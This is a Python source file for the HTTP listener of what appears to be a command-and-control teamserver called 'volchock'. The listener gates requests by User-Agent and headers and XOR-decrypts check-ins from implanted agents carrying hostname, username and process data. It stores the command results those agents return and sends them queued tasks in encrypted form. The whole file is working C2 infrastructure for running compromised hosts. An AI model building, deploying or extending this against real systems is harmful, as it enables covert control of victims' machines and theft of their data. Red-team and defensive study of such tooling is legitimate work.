# teamserver/listener/http_listener.py
# Implements the HTTP listener component, handling incoming HTTP 
# communications and routing for the Teamserver.

from flask import Flask, request, jsonify
import threading
import time
import json
from .base_listener import BaseListener
from teamserver.encryption.xor_util import XORCipher
import base64
from teamserver.logger.CustomLogger import CustomLogger
log = CustomLogger("volchock")


class HttpListener(BaseListener):
    def __init__(self, config, name, host="0.0.0.0", port=80, request_queue=None, agent_handler=None, xor_key=None):
        super().__init__(config)
        log.debug("[+] HttpListener initialized")
        self.name = name
        self.host = host
        self.port = port
        self.flask_app = Flask(self.config.get('name', 'http_listener'))
        self.request_queue = request_queue
        self.agent_handler = agent_handler
        if xor_key is None:
            log.critical("[!] xor_key must be provided to HttpListener.")
            raise ValueError("xor_key must be provided to HttpListener")
        self.xor_cipher = XORCipher(xor_key)
        for uri in self.config.get('uri_paths', ['/']):
            self.flask_app.add_url_rule(
                uri,
                endpoint=uri,
                view_func=self.handle_request,
                methods=['GET', 'POST']
            )
        self.thread = threading.Thread(target=self._run, daemon=True)
        self._running = threading.Event()

    def handle_request(self):
        # user-agent check
        headers = dict(request.headers)
        expected_agent = self.config.get('user_agent')
        if expected_agent and request.headers.get("User-Agent") != expected_agent:
            log.error("[!] Invalid User-Agent")
            return "Invalid User-Agent", 403
        # header check
        expected_headers = self.config.get('http_headers', {})
        for header, value in expected_headers.items():
            if request.headers.get(header) != value:
                log.error("[!] Invalid header")
                return f"Invalid header {header}", 403
        # decoding data
        agent_id = None
        decoded_json = {}
        try:
            enc_data = request.get_data()
            decoded_result = self.xor_cipher.decrypt(enc_data)
            parsed_json = json.loads(decoded_result)
            agent_id = parsed_json.get("agent_id")
            hostname = parsed_json.get("hostname")
            username = parsed_json.get("username")
            process_name = parsed_json.get("process_name")
            results = parsed_json.get("results")
            # register or update agent data
            now = time.time()
            agent_fields = {
                "last_seen": now,
                "ip": request.remote_addr,
                "process_name": process_name,
                "agent_id": agent_id,
                "hostname": hostname,
                "username": username
            } 
            if not self.agent_handler.get_agent(agent_id):
                self.agent_handler.register_agent(agent_id, agent_fields)
            else:
                self.agent_handler.update_agent(agent_id, agent_fields)
            # checking result data
            if( len(str(results))>1 ):
                results = str(base64.b64decode(results).decode("utf-8", errors="replace"))
                log.debug(f"[+] Command result received from {agent_id}")
                self.agent_handler.push_agent_result(agent_id, results)
            # if commands are in queue, send it
            cmd = self.agent_handler.pop_commands(agent_id)
            if( len(str(cmd)) > 0 ):
                log.debug(f"[+] Sending task to {agent_id}")
                clear_task = '{"task":"'+cmd+'"}'
                encoded_task = self.xor_cipher.encrypt( clear_task.encode("utf-8", errors="replace") )
                jason = jsonify(str(encoded_task))
                return jason
        except Exception as exc:
            log.error(f"[!] Error while handling agent data : {exc}")
            pass
        return jsonify("")

    def start(self):
        log.info(f"[+] Starting HTTP listener {self.config.get('name', 'http_listener')} on {self.host}:{self.port}")
        self._running.set()
        self.thread.start()

    def _run(self):
        self.flask_app.run(host=self.host, port=self.port, debug=False, use_reloader=False)

    def stop(self):
        log.info(f"[+] Stopping HTTP listener {self.config.get('name', 'http_listener')}")
        self._running.clear()

    def join(self):
        while self.thread.is_alive():
            time.sleep(1)